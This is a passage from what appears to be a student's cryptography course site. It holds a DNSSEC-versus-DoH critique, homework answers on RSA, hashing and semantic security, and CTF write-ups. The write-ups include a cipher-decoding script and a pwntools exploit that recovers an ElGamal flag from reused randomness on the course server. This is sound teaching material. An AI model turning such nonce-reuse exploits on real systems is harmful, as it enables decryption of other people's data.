websites or authentication vendors\nYour own reflection # If I were the author of either paper, I would explore solutions to improve security, such as incorporating user education and awareness or implementing secure communication channels for a password reset. Unsolved questions that I want to investigate include how to balance security and usability in the authentication and password reset processes. The broader impacts of these proposed technologies are significant, as compromised authentication or passwords can lead to data breaches and financial losses. Overall, these papers highlight the need to address not only technical vulnerabilities but also human factors in cybersecurity, and to continually strive for more secure practices.\n"},{"id":56,"href":"/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/","title":"Cryptography and Network Security – Comparative Critique 3","section":"Securities","content":" Cryptography and Network Security – Comparative Critique 3 # Reading Topic: DNSSEC VS DoH(DNS-over-HTTPS) # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\nBackground # 什麼是 DNSSEC？\n什麼是 DNSSEC？\n網域名稱系統安全性擴充 (DNSSEC) 可為網域名稱的 DNS (網域名稱系統) 加上電子簽名，藉此判斷來源網路名稱的真實性。此功能可以保護網路使用者不受假造 DNS 資料的威脅，讓使用者要求正確網址時不會取得其他有意誤導或惡意製作的網址。\n啟用 DNSSEC 後，DNS 查閱會使用電子簽名驗證網站 DNS 來源是否有效，這樣做可以協助防止受到特定類型的攻擊，而當電子簽名不一致的時候，瀏覽器便不會顯示網站。\nWhat is DNS Cache Poisoning? - 小心網域名稱伺服器快取毒害(DNS cache poisoning)攻擊\n簡單的說，DNS 通常都會實做快取(Cache)功能，若 DNS 收到來自惡意假造的 DNS 封包，導致將錯誤的 Domain Name v.s. IP 對應資料快取在 DNS Server 中，就會讓使用這台 DNS Server 的使用者連結到錯誤的 IP，這將會是個十分嚴重的安全性漏洞！而這樣的安全性漏洞就稱之為 DNS cache poisoning\nSummary of paper 1 # DNSSEC is a security extension protocol designed to protect the security of information during domain name resolution. It uses public key encryption technology to sign and verify data in the network DNS, thereby ensuring the integrity and authenticity of the data. DNSSEC provides a mechanism for clients to verify whether the DNS resource record (such as IP addresses, email addresses, etc.) they requested is from the correct source and has not been tampered with. This effectively prevents security issues such as DNS cache poisoning attacks and DNS hijacking. DNSSEC plays an important role in protecting Internet security, and many government agencies, financial institutions, and businesses have begun to deploy DNSSEC.\nSummary of paper 2 # DoH is a mechanism that encrypts DNS queries over the HTTPS protocol. Its purpose is to improve the reliability and efficiency of DNS queries while increasing privacy and security. Traditional DNS queries are in plaintext and vulnerable to eavesdropping and interception. Using DoH, DNS queries are encrypted, protecting users\u0026rsquo; privacy and data security. DoH can also prevent DNS cache poisoning attacks and DNS hijacking, improving the security of DNS resolution. DoH can also help network providers reduce a load of DNS queries, improving network performance and speed. Since DoH is transmitted via the standard HTTPS protocol, it can more easily pass through corporate and organizational firewalls and is not blocked or restricted by ISPs.\nComparison between them # Both of them can prevent DNS cache poisoning attacks and DNS hijacking attacks and enhance the security and reliability of DNS queries. Also, they can preserve the privacy of users, e.g., DNSSEC can avoid DNS man-in-the-middle attacks and data tampering and DoH can encrypt DNS queries, protecting users\u0026rsquo; privacy and data security, preventing DNS eavesdropping and interception. However, they still have some drawbacks to conquer such as the implementation of DNSSEC and DoH are complex and requires special configuration and management. Moreover, if DoH or DNSSEC is used, it may increase network congestion and delay, because it needs to use HTTPS protocol (for DoH) to encrypt and decrypt DNS queries.\nYour own reflection # If I were the author, I would consider conducting more experiments and evaluations to validate the effectiveness and performance of these technologies in different scenarios. I would also explore ways to enhance their interoperability with other security technologies and ensure their widespread adoption and implementation. There are still some unsolved questions regarding DNSSEC and DoH, such as the challenges of key management, the potential impact on network performance, and the trade-offs between security and usability. Further research is needed to address these questions and refine these technologies.\n"},{"id":57,"href":"/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/","title":"Cryptography and Network Security – Homework 1","section":"Securities","content":" Cryptography and Network Security – Homework 1 # tags: NTUCNS # :::spoiler TOC [TOC] ::: :::info Official Solution ::: Student ID: R11921A16 Name: 何秉學\nHandwriting # 1. CIA # Ans: Confidentiality means all of the sensitive messages or information that can be protected so that just the people who have the authentication can edit or browse the information.\nIntegrity refers to the completeness of the message you transferred and ensured that the message is not altered by an unauthenticated person.\nAvailability means the system must be workable during the service time. In addition, the latency during querying is tolerable and is as short as possible.\nThe real-world instance including these security requirements is the bank duty system. That is, it must be guaranteed that the sensitive message is not accessible during transferring time such as the account information, bank card id, especially the bank card password, etc. Furthermore, the bank system must maintain the completeness of its service such as website service and the querying time must be tolerable. Moreover, it must ensure the data is safe that won\u0026rsquo;t be altered by anybody during transmission.\n2. Hash Function # Ans: one-wayness means a function $y=f(x)$ is one-way if it is easy to compute $y$ from $x$ but \u0026ldquo;hard\u0026rdquo; to compute $x$ from $y$. For instance, it\u0026rsquo;s usually used for password storage and data encryption such as RSA or Diffie-Hellman, to generate keys that are used to encrypt and decrypt data.\nweak collision resistance: For given $m$ then find (compute) a collision $(m, m’)$ is difficult. That is, $h(m)=h(m\u0026rsquo;)$ is hard to find $m\u0026rsquo;$ when $m$ is given. This objective is for the integrity of data. For instance, it\u0026rsquo;s usually used to verify file integrity or password verification. When the user uploads a file or enters the password, the hash value must be the same as the data stored in the database.\nstrong collision resistance: Difficult to find a (some) collision $(m, m’)$. That is, it\u0026rsquo;s difficult(computationally infeasible) to find any two value that has the same hash value. For example, digital signatures and message authentication codes will use this concept to construct the algorithm. This concept can guarantee that the digital signature is unique furthermore, it\u0026rsquo;s infeasible for attackers to find the collision.\n3. Multi-prime RSA # Ans: Assume $c$ is the cipher that encrypted by RSA, $d$ is the inverse of chosen $e$, and $n$ is the multiplication result of two prime. $$ c^d\\ mod\\ n=(m^e)^d\\ mod\\ n=m^{ed}\\ mod\\ n=m^1\\ mod\\ n=m,\\ \\because d \\equiv e^{-1}\\ mod\\ \\phi(N) $$\nAns: First reason: it\u0026rsquo;s easily to find $p=q=\\sqrt{N}$ when $N$ is given. Second reason: when $p=q$, some message that $x∈{0…N−1}$ can not be decrypted while $x≡0\\ (mod\\ p)$. However, this is not a big problem if two prime number is as big as enough.\nAns: WLOG, we can use 3-prime number as RSA parameters and we can also use CRT(Chinese Remainder Theorem) to optimize the problem $M \\equiv C^d\\ (mod\\ N)$, where $N=P_1P_2P_3$ and also they\u0026rsquo;re pairwise coprime. So, our objective is to find what $M$ is that we just try to decrypt a cipher $C$. Also, we wonder if CRT can optimize the computation process.\nFirst, we assume $$ \\left{ \\begin{array}{c} x\\ \\equiv \\ m_1\\ (mod\\ P_1) \\ x\\ \\equiv \\ m_2\\ (mod\\ P_2) \\ x\\ \\equiv \\ m_3\\ (mod\\ P_3) \\end{array} \\right. \\ \\ and\\ \\ \\left{ \\begin{array}{c} m_1\\ \\equiv \\ C^d\\ (mod\\ P_1) \\ m_2\\ \\equiv \\ C^d\\ (mod\\ P_2) \\ m_3\\ \\equiv \\ C^d\\ (mod\\ P_3) \\end{array} \\right. $$\nSecond, we have to compute what is $m_1$, $m_2$, $m_3$ by using Fermat\u0026rsquo;s Little Theorem, which is defined as following: :::info If $P$ is a prime number, then $a^P \\equiv a\\ (mod\\ P)$. If $P$ is a prime number and $a$ is not divisible by $P$, i.e. $a \\equiv b\\ (mod\\ P)\\ where\\ b \\ne 0$, then $a^{P-1} \\equiv 1\\ (mod\\ P)$. :::\n$$ \\left{ \\begin{array}{c} \\begin{aligned} m_1\\ \u0026amp;≡ \\ C^d\\ (mod\\ P_1) \\ \u0026amp;≡\\ (C^{P_1-1})^{\\alpha_1}*C^{\\beta_1}\\ (mod\\ P_1) \\ \u0026amp;≡\\ C^{\\beta_1}\\ (mod\\ P_1) \\end{aligned} \\end{array} \\ \\because\\ (C^{P_1-1})^{\\alpha_1}=1 \\right. $$ $$ \\left{ \\begin{array}{c} \\begin{aligned} m_2\\ \u0026amp;≡ \\ C^d\\ (mod\\ P_2) \\ \u0026amp;≡\\ (C^{P_2-1})^{\\alpha_2}*C^{\\beta_2}\\ (mod\\ P_2) \\ \u0026amp;≡\\ C^{\\beta_2}\\ (mod\\ P_2) \\end{aligned} \\end{array} \\ \\because\\ (C^{P_2-1})^{\\alpha_2}=1 \\right. $$ $$ \\left{ \\begin{array}{c} \\begin{aligned} m_3\\ \u0026amp;≡ \\ C^d\\ (mod\\ P_3) \\ \u0026amp;≡\\ (C^{P_3-1})^{\\alpha_3}*C^{\\beta_3}\\ (mod\\ P_3) \\ \u0026amp;≡\\ C^{\\beta_3}\\ (mod\\ P_3) \\end{aligned} \\end{array} \\ \\because\\ (C^{P_3-1})^{\\alpha_3}=1 \\right. $$\nThird, we can compute $x$ by using $m_1$, $m_2$, $m_3$ and CRT We compute two of them first. $$ \\left{ \\begin{array}{c} x\\ \\equiv \\ m_1\\ (mod\\ P_1) \\ x\\ \\equiv \\ m_2\\ (mod\\ P_2) \\end{array} \\right. $$ At the beginning, we use Euclidean Algorithm to construct $1=aP_1+bP_2$ where ${a,\\ b} \\in \\mathbb{Z}$, then $x=aP_1m_2+bP_2m_1+P_1P_2k\u0026rsquo;$ where ${a,\\ b,\\ k\u0026rsquo;} \\in \\mathbb{Z}$ $$x \\equiv aP_1m_2+bP_2m_1\\ (mod\\ P_1P_2)$$ Next, we compute the rest of them and repeat the previous step $$ \\left{ \\begin{array}{c} \\begin{aligned} x \u0026amp;≡ aP_1m_2+bP_2m_1\\ (mod\\ P_1P_2) \\ x \u0026amp;≡ \\ m_3\\ (mod\\ P_3) \\end{aligned} \\end{array} \\right. $$ To construct $1=cP_3+dP_1P_2$ by using Euclidean Algorithm then $x=cP_3(aP_1m_2+bP_2m_1)+dP_1P_2m_3+P_1P_2P_3k\u0026rsquo;\u0026rsquo;$ where ${a,b,c,d,k\u0026rsquo;,k\u0026rsquo;\u0026rsquo;} \\in \\mathbb{Z}$ And done, the $x$ is uniquely equivalent to $M$ that what we want.\nWe can make an instance to prove the correctness. Assume $P_1=3$, $P_2=7$, $P_3=13$ and $n=3×7×13=273$，$φ(n)= 2×6×12=144$，we choose $e=5$，and the inverse of $e$ is $d=29$\nEncryption: $c= m^e\\ (mod\\ n)=18^5\\ mod\\ 273=135$ Decryption: $m= c^d\\ (mod\\ n)=135^{29}\\ mod\\ 273=18$\nNow, we use CRT to optimize the computation process Assume $$ \\left{ \\begin{array}{c} x\\ \\equiv \\ m_1\\ (mod\\ 3) \\ x\\ \\equiv \\ m_2\\ (mod\\ 7) \\ x\\ \\equiv \\ m_3\\ (mod\\ 13) \\end{array} \\right. \\ \\ and\\ \\ \\left{ \\begin{array}{c} m_1\\ \\equiv \\ 135^{29}\\ (mod\\ 3) \\ m_2\\ \\equiv \\ 135^{29}\\ (mod\\ 7) \\ m_3\\ \\equiv \\ 135^{29}\\ (mod\\ 13) \\end{array} \\right. $$\nThen $$ \\left{ \\begin{array}{c} \\begin{aligned} m_1\\ \u0026amp;≡ \\ 135^{29}\\ (mod\\ 3) \\ \u0026amp;≡\\ (135^2)^{14}*135^1\\ (mod\\ 3) \\ \u0026amp;≡\\ 135\\ (mod\\ 3) \\ \u0026amp;≡\\ 0\\ (mod\\ 3) \\end{aligned} \\end{array} \\ \\because\\ (135^2)^{14}=1 \\right. $$ $$ \\left{ \\begin{array}{c} \\begin{aligned} m_2\\ \u0026amp;≡ \\ 135^{29}\\ (mod\\ 7) \\ \u0026amp;≡\\ (135^6)^{4}*135^5\\ (mod\\ 7) \\ \u0026amp;≡\\ 2^5\\ (mod\\ 7) \\ \u0026amp;≡\\ 4\\ (mod\\ 7) \\end{aligned} \\end{array} \\ \\because\\ (135^6)^{4}=1 \\right. $$ $$ \\left{ \\begin{array}{c} \\begin{aligned} m_3\\ \u0026amp;≡ \\ 135^{29}\\ (mod\\ 13) \\ \u0026amp;≡\\ (135^{12})^{2}*135^5\\ (mod\\ 13) \\ \u0026amp;≡\\ 5^5\\ (mod\\ 13) \\ \u0026amp;≡\\ 5\\ (mod\\ 13) \\end{aligned} \\end{array} \\ \\because\\ (135^{12})^{2}=1 \\right. $$\nNext, we can start to compute $x$. $$ \\left{ \\begin{array}{c} x\\ \\equiv \\ 0\\ (mod\\ 3) \\ x\\ \\equiv \\ 4\\ (mod\\ 7) \\ x\\ \\equiv \\ 5\\ (mod\\ 13) \\end{array} \\right. $$ We compute 2 of them first. The $gcd(3,7)=1$, so we tried to construct $1=17+(-2)3\\ \\to$ $$ \\begin{aligned} x\u0026amp;=710+3*(-2)4+21k\\ \u0026amp;=-24+21k,\\ k \\in \\mathbb{Z}\\ x\u0026amp;\\equiv 18\\ (mod\\ 21) \\end{aligned} $$ Then we compute $$ \\left{ \\begin{array}{c} x\\equiv 18\\ (mod\\ 21) \\ x\\equiv \\ 5\\ (mod\\ 13) \\end{array} \\right. $$ Repeat previous step, the $gcd(13,21)=1$, then we can construct $1=215+13*(-8)$ $$ \\begin{aligned} x\u0026amp;=2155+13*(-8)18+2113k\u0026rsquo; \\ \u0026amp;=-1347+273k\u0026rsquo; \\ x\u0026amp;=18,\\ if\\ k\u0026rsquo;=5 \\end{aligned} $$\nFinally, we decrypt $M=x=18$ successfully by using CRT to optimize the whole computation process.\nAns: The advantages of the multi-prime RSA algorithm are mainly manifested in two aspects:\nIt can reduce the calculation amount of key generation. The application of CRT can reduce the calculation amount of decryption and signature. On the other hand, the smaller the prime factor, the easier it is to factorize large numbers. Data published by RSA Laboratories shows that the more prime numbers used, the lower the RSA strength. The following table lists the amount of computation (unit: MIPS·year) required to break the 2-to-multiple prime RSA system.\nSo, here is another disadvantage of multi-prime RSA that requires larger key sizes to achieve the same level of security as regular RSA. This can lead to slower encryption and decryption times and larger storage requirements for keys.\nKey Length 2 Prime Number 3 Prime Number 4 Prime Number 5 Prime Number 512 bits $2.1*10^6$ Easy Very Easy Very Very Easy 768 bits $4.0*10^{11}$ $1.2*10^8$ Easy Very Easy 1024 bits $1.4*10^{16}$ $3.0*10^{11}$ $2.1*10^8$ Easy 1536 bits $8.2*10^{23}$ $1.8*10^{17}$ $1.9*10^{13}$ $4.2*10^{10}$ 2048 bits $3.8*10^{30}$ $1.5*10^{22}$ $3.2*10^{17}$ $2.3*10^{14}$ (skip)\n4. Fun With Semantic Security # I\u0026rsquo;ll prove all these theorem by contrapositive. In addition, the premise of these question is that $E(Enc(k,\\ m),\\ Dec)$ is $S.S.$(semantic secure), so $|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\le \\varepsilon$ Assume $f(\\cdot )$ is a guessing function that adversary used to guess $b\u0026rsquo;$ by the return value from challenger. The model is the same as lecture taught shown as below. Assume $\\mathbb{K},\\mathbb{M}$ are both group with a binary operation $+$ and ${k,m} \\xleftarrow{R} (\\mathbb{K},\\mathbb{M})$ Ans: Assume $SS_{adv}[B, E\u0026rsquo;]$ is negligible $\\implies\\ SS_{adv}[A, E]$ is negligible. Therefore, I can use contrapositive to prove if $E(Enc, Dec)$ is not $S.S.\\ \\implies E\u0026rsquo;(Enc\u0026rsquo;, Dec\u0026rsquo;)$ is not $S.S.$ as well. Because there must exist a magic function $f(\\cdot)$ that can guess $b\u0026rsquo;$ with high confidence $\\varepsilon\u0026rsquo; \\gt \\varepsilon$\nAssume $c=Enc(k,\\ m_b)$ and $E$ is not $S.S.$, then we know $$ \\begin{aligned} SS_{adv}[c,\\ E]\u0026amp;=|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\ \u0026amp;=|Pr[b\u0026rsquo;=1|b=0]-Pr[b\u0026rsquo;=1|b=1]| \\ \u0026amp;=|Pr[f(c)=1|b=0]-Pr[f(c)=1|b=1]| \\ \u0026amp;=|Pr[f(Enc(k,\\ m_b))=1|b=0]-Pr[f(Enc(k,\\ m_b))=1|b=1]| \\ \u0026amp;=|Pr[f(Enc(k,\\ m_0))=1]-Pr[f(Enc(k,\\ m_1))=1]| \\gt \\varepsilon \\end{aligned} $$\nBut how about $E\u0026rsquo;$ that defined a new decryption cipher? We also can use the magic function that found in original decryption cipher to address this question. $$ \\begin{aligned} SS_{adv}[c,\\ E\u0026rsquo;]\u0026amp;=|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\ \u0026amp;=|Pr[b\u0026rsquo;=1|b=0]-Pr[b\u0026rsquo;=1|b=1]| \\ \u0026amp;=|Pr[f(c||r)=1|b=0]-Pr[f(c||r)=1|b=1]| \\ \u0026amp;=|Pr[f(Enc(k,\\ m_b)||r)=1|b=0]-Pr[f(Enc(k,\\ m_b)||r)=1|b=1]| \\end{aligned} $$ Though, we don\u0026rsquo;t know the length of $r$ (i.e. $|r|$), we still can repeat the guessing process while decrease the 1 byte of $c||r$ for each time until the parameter of function $f(\\cdot)$ is $|c|$, then I can still aware of the guessing result with high confidence. That is $$ \\begin{aligned} SS_{adv}[c,\\ E\u0026rsquo;]\u0026amp;=|Pr[f(Enc(k,\\ m_b)||r)=1|b=0]-Pr[f(Enc(k,\\ m_b)||r)=1|b=1]| \\ \u0026amp;= |Pr[f(Enc(k,\\ m_b))=1|b=0]-Pr[f(Enc(k,\\ m_b))=1|b=1]| \\ \u0026amp;= |Pr[f(Enc(k,\\ m_0))=1]-Pr[f(Enc(k,\\ m_1))=1]| \\gt \\varepsilon \\end{aligned} $$\nThen, we know that if $E$ is not $S.S.$, then $E\u0026rsquo;$ is not $S.S.$ as well. In other words, if $E$ is $S.S.$, then $E\u0026rsquo;$ is $S.S.$ definitely.\nAns: Follow the concept above and we assume $m\u0026rsquo;=m+r$ and $m_b\u0026rsquo; = m_b+r$. Premise: $E(Enc(k,m), Dec(\\cdot))$ is $S.S.$ then $E(Enc(k,m+r), Dec(\\cdot))$ is $S.S.$ as well where $r \\xleftarrow{R} \\mathbb{M}$. Because $\\mathbb{M}$ is a group that with a binary operation +, $m+r\\in \\mathbb{M}$ which means $E(Enc\u0026rsquo;(k,m_b\u0026rsquo;),\\ Dec(\\cdot))$ is $S.S.$ as well.\nAgain, if $E(Enc, Dec)$ is not $S.S.$ then there must exist a magic function $f\u0026rsquo;(\\cdot)$ that can guess $b\u0026rsquo;$ with high confidence $\\varepsilon\u0026rsquo; \\gt \\varepsilon$\nAssume $c=Enc(k,\\ m_b\u0026rsquo;)$ and $E$ is not $S.S.$, then we know $$ \\begin{aligned} SS_{adv}[c,\\ E]\u0026amp;=|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\ \u0026amp;=|Pr[b\u0026rsquo;=1|b=0]-Pr[b\u0026rsquo;=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;(c)=1|b=0]-Pr[f\u0026rsquo;(c)=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;(Enc(k,\\ m_b\u0026rsquo;))=1|b=0]-Pr[f\u0026rsquo;(Enc(k,\\ m_b\u0026rsquo;))=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;(Enc(k,\\ m_0\u0026rsquo;))=1]-Pr[f\u0026rsquo;(Enc(k,\\ m_1\u0026rsquo;))=1]| \\gt \\varepsilon \\end{aligned} $$\nBut how about $E\u0026rsquo;$ that defined a new decryption cipher? We also can use the magic function that found in original decryption cipher to address this question. $$ \\begin{aligned} SS_{adv}[c,\\ E\u0026rsquo;]\u0026amp;=|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\ \u0026amp;=|Pr[b\u0026rsquo;=1|b=0]-Pr[b\u0026rsquo;=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;(Enc\u0026rsquo;(k,\\ m_b+r)||r)=1|b=0]-Pr[f\u0026rsquo;(Enc\u0026rsquo;(k,\\ m_b+r)||r)=1|b=1]| \\end{aligned} $$ Again, we don\u0026rsquo;t know $|r|$, we still can repeat the guessing process while decrease the 1 byte of $c||r$ for each time (i.e. $f\u0026rsquo;([Enc\u0026rsquo;(k,m_b\u0026rsquo;)||r][:-j])$ where $j={1,\\cdots,|r|}$). In a word, $$ \\begin{aligned} SS_{adv}[c,\\ E\u0026rsquo;]\u0026amp;=|Pr[f\u0026rsquo;(Enc(k,\\ m_b\u0026rsquo;)||r)=1|b=0]-Pr[f\u0026rsquo;(Enc\u0026rsquo;(k,\\ m_b\u0026rsquo;)||r)=1|b=1]| \\ \u0026amp;= |Pr[f\u0026rsquo;(Enc(k,\\ m_b\u0026rsquo;))=1|b=0]-Pr[f\u0026rsquo;(Enc(k,\\ m_b\u0026rsquo;))=1|b=1]| \\ \u0026amp;= |Pr[f\u0026rsquo;(Enc(k,\\ m_0\u0026rsquo;))=1]-Pr[f\u0026rsquo;(Enc(k,\\ m_1\u0026rsquo;))=1]| \\gt \\varepsilon \\end{aligned} $$\nThen, we know that if $E$ is not $S.S.$, then $E\u0026rsquo;$ is not $S.S.$ as well. In other words, if $E$ is $S.S.$, then $E\u0026rsquo;$ is $S.S.$ definitely.\nAns: Follow the concept of previous 2 questions and we assume $k\u0026rsquo;=k+r$. Premise: $E(Enc(k,m), Dec(\\cdot))$ is $S.S.$ then $E(Enc(k+r,m), Dec(\\cdot))$ is $S.S.$ as well where $r \\xleftarrow{R} \\mathbb{K}$. Because $\\mathbb{K}$ is a group that with a binary operation +, $k+r\\in \\mathbb{K}$ which means $E(Enc\u0026rsquo;(k\u0026rsquo;,m_b),\\ Dec(\\cdot))$ is $S.S.$ as well.\nAgain, if $E(Enc, Dec)$ is not $S.S.$ then there must exist a magic function $f\u0026rsquo;\u0026rsquo;(\\cdot)$ that can guess $b\u0026rsquo;$ with high confidence $\\varepsilon\u0026rsquo; \\gt \\varepsilon$\nAssume $c=Enc(k\u0026rsquo;,\\ m_b)$ and $E$ is not $S.S.$, then we know $$ \\begin{aligned} SS_{adv}[c,\\ E]\u0026amp;=|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\ \u0026amp;=|Pr[b\u0026rsquo;=1|b=0]-Pr[b\u0026rsquo;=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;\u0026rsquo;(c)=1|b=0]-Pr[f\u0026rsquo;\u0026rsquo;(c)=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_b))=1|b=0]-Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_b))=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_0))=1]-Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_1))=1]| \\gt \\varepsilon \\end{aligned} $$\nBut how about $E\u0026rsquo;$ that defined a new decryption cipher? We also can use the magic function that found in original decryption cipher to address this question. $$ \\begin{aligned} SS_{adv}[c,\\ E\u0026rsquo;]\u0026amp;=|Pr[Exp^{SS}(0)=1]-Pr[Exp^{SS}(1)=1]| \\ \u0026amp;=|Pr[b\u0026rsquo;=1|b=0]-Pr[b\u0026rsquo;=1|b=1]| \\ \u0026amp;=|Pr[f\u0026rsquo;\u0026rsquo;(Enc\u0026rsquo;(k\u0026rsquo;,\\ m_b)||r)=1|b=0]-Pr[f\u0026rsquo;\u0026rsquo;(Enc\u0026rsquo;(k\u0026rsquo;,\\ m_b)||r)=1|b=1]| \\end{aligned} $$ Again, we don\u0026rsquo;t know $|r|$, we still can repeat the guessing process while decrease the 1 byte of $c||r$ for each time (i.e. $f\u0026rsquo;([Enc\u0026rsquo;(k,m_b\u0026rsquo;)||r][:-j])$ where $j={1,\\cdots,|r|}$). In a word, $$ \\begin{aligned} SS_{adv}[c,\\ E\u0026rsquo;]\u0026amp;=|Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_b)||r)=1|b=0]-Pr[f\u0026rsquo;\u0026rsquo;(Enc\u0026rsquo;(k\u0026rsquo;,\\ m_b)||r)=1|b=1]| \\ \u0026amp;= |Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_b))=1|b=0]-Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_b))=1|b=1]| \\ \u0026amp;= |Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_0))=1]-Pr[f\u0026rsquo;\u0026rsquo;(Enc(k\u0026rsquo;,\\ m_1))=1]| \\gt \\varepsilon \\end{aligned} $$\nThen, we know that if $E$ is not $S.S.$, then $E\u0026rsquo;$ is not $S.S.$ as well. In other words, if $E$ is $S.S.$, then $E\u0026rsquo;$ is $S.S.$ definitely.\nCTF # 5. Simple Crypto # Recon # Round 1 Just simple ROT-13\nRound 2 Just simple rail fence cipher\nRound 3 Can observe that the question gave the b64encode(c1) and m1 and we need to decrypt to m2 using b64encode(c2) it gave us. I thought about it for a long time. It seems one-time-pad reused problem. Because the length of b64encode(c1) and m1 are the same. So, I xor them and get the key. In addition, I repeated the operation that xor b64encode(c2) and key then I got the plain text message. The whole script is as below.\nThe attack can be success only if the length of b64encode(c1) greater than the length of b64encode(c2). It means we can get enough key to decrypt c2, otherwise, the plain text is incomplete.\nRound 4 Hint 1: One-layer fence is not solid enough, how about two? Hint 2: You can safely ignore all white spaces and punctuation marks.\nYou can observe that every time the cipher is just changed the capital of the letter and the semantic sentence is preserved. So, we can assume that it encrypt every bits in alphabetic with its upper or lower letter(i.e. upper letter is represented to 1, otherwise, is represented to 0). Therefore, you can use the script below to transfer every character to binary. After the conversion, the length of the binary is $155$, it means we have to find something like morse code to decode it. At the beginning, my perspective is baudot code that encrypt/decrypt the code with every 5 bits. This is perfectly coincide the factor of $155$, however, nothing plaintext-like string appeared. Then I continued looking for another baudot-like cipher. The answer is bacon cipher that similar to baudot which is also encrypt/decrypt the code with every 5 bits. After the conversion, the string was still incorrect. So, I tried various methods to decrypt it. Then I think the this question mentioned fence again that means this is the advanced fence question that I should address. Therefore, I tried rail fence cipher again to decrypt it to semantic meaningful string(means I can read it as normal English). Exploit # Round 1 ROT-Based online solver\nRound 2 Rail Fense Cipher online solver\nRound 3 One-Time-Pad\nRound 4 Binary encrypt in Alphabetic → Bacon Cipher → Rail Fence Cipher 4-1. Alphabet → Binary Alphabet → Binary\nimport re ciphertext = input(\u0026#34;Cipher Text of Round 4: \u0026#34;) ciphertext = ciphertext.replace(\u0026#39;!\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;,\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;.\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;) plaintext = \u0026#39;\u0026#39; for i in range(len(ciphertext)): plaintext += \u0026#39;A\u0026#39; if re.search(r\u0026#34;[a-z]\u0026#34;, ciphertext[i]) else \u0026#39;B\u0026#39; # print(plaintext) for i in range(0, len(plaintext), 5): print(plaintext[i:i+5], end=\u0026#34; \u0026#34;) 4-2. Bacon Cipher 4-3. Rail Fense Cipher online solver\nRound 5 Base64 decode\nFlag 5: CNS{5upeR_3asy_c1a55ic@l_cryp70!}\n6. ElGamal Cryptosystem # Recon # 6-1 As the screenshot above, seems it reused $a$ that it should be chosen randomly. Thus, as the algorithm taught on class $$c_1=c_1\u0026rsquo;=(self.g)^y\\ (mod\\ self.P)$$ $$c_2=(self.pk)^y\\ (mod\\ self.P)\\ *\\ flag1\\ (mod\\ self.P)$$ $$c_2=(self.pk)^y\\ (mod\\ self.P)\\ *\\ m_2\\ (mod\\ self.P)$$\n6-2\n6-3 Keys quantities: 5 Threshold: 5(That means the user needs $5$ keys to generate the secret(constant term of the formula)\nExploit # 6-1 $$tmp = (self.pk)^y\\ (mod\\ self.P)=c_2\u0026rsquo;inverse(m_2,\\ self.P)\\ %\\ self.P$$ $$flag1 = c_2inverse(tmp,\\ self.P)\\ %\\ self.P$$ ::: spoiler source code\nfrom pwn import * from Crypto.Util.number import bytes_to_long, long_to_bytes from Crypto.Util.number import inverse r = remote(\u0026#39;cns.csie.org\u0026#39;, 6001) context.arch = \u0026#39;amd64\u0026#39; r.recvuntil(b\u0026#34;P = \u0026#34;) p = int(r.recvline().strip().decode()) r.recvuntil(b\u0026#34;g = \u0026#34;) g = int(r.recvline().strip().decode()) r.recvuntil(b\u0026#34;cipher = (\u0026#34;) c1 = int(r.recvuntil(b\u0026#34;, \u0026#34;).decode().replace(\u0026#34;, \u0026#34;, \u0026#34;\u0026#34;)) c2 = int(r.recvuntil(b\u0026#34;)\u0026#34;).decode().replace(\u0026#34;)\u0026#34;, \u0026#34;\u0026#34;)) log.info(\u0026#34;P = {}\u0026#34;.format(p)) log.info(\u0026#34;g = {}\u0026#34;.format(g)) log.info(\u0026#34;c1 = {}\u0026#34;.format(c1)) log.info(\u0026#34;c2 = {}\u0026#34;.format(c2)) m2 = \u0026#39;1\u0026#39; r.recvuntil(b\u0026#34;Do you want to encrypt something? (y/n): \u0026#34;) r.sendline(b\u0026#39;y\u0026#39;) r.recvuntil(b\u0026#34;Give me your message: \u0026#34;) r.sendline(m2.encode()) r.recvuntil(b\u0026#34;Your cyphertext (\u0026#34;) c1_ = int(r.recvuntil(b\u0026#34;, \u0026#34;).decode().replace(\u0026#34;, \u0026#34;, \u0026#34;\u0026#34;)) c2_ = int(r.recvuntil(b\u0026#34;)\u0026#34;).decode().replace(\u0026#34;)\u0026#34;, \u0026#34;\u0026#34;)) log.info(\u0026#34;c1\\\u0026#39; = {}\u0026#34;.format(c1_)) log.info(\u0026#34;c2\\\u0026#39; = {}\u0026#34;.format(c2_)) m2 = bytes_to_long(m2.encode()) log.info(\u0026#34;m2 = {}\u0026#34;.format(m2)) tmp = c2_ * inverse(m2, p) % p flag = c2 * inverse(tmp, p) % p flag = bytes.fromhex(hex(flag).replace(\u0026#39;0x\u0026#39;, \u0026#34;\u0026#34;)).decode(\u0026#39;utf-8\u0026#39;) log.info(flag) r.close() r.interactive() ::: Flag 6-1: 